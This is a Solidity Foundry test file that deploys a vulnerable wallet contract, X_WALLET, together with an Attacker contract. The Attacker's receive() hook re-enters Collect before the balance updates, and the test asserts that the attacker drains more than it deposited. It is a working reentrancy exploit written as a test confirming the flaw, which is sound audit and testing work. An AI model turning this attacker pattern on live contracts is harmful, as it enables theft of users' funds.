
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {X_WALLET, Log} from "../src/X_WALLET.sol";

contract TestReentrancyX_WALLET is Test {
    X_WALLET public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new X_WALLET(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 1 ether && attackVal < type(uint128).max / 4);

        uint256 initialVictimBalance = attackVal * 4;
        vm.deal(address(_contractUnderTest), initialVictimBalance);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);

        // Ensure unlock time has passed
        vm.warp(block.timestamp + 1000);

        _attacker.attack(attackVal);

        // Victim should have lost more than the attacker initially deposited
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
        assertGt(address(_attacker).balance, attackVal, "Attacker did not profit from reentrancy.");
    }

    receive() external payable {}
}

contract Attacker {
    X_WALLET public _victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        _victim = X_WALLET(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedAttackVal = val;

        // Deposit into the vulnerable wallet via Put
        _victim.Put{value: val}(block.timestamp);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedAttackVal = val;

        // Trigger the vulnerable Collect function
        _victim.Collect(val);

        if (attackCallCount > 1 && address(this).balance > initialSnapshot + 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            // Re-enter Collect before balance is updated
            _victim.Collect(storedAttackVal);
        }
    }
}
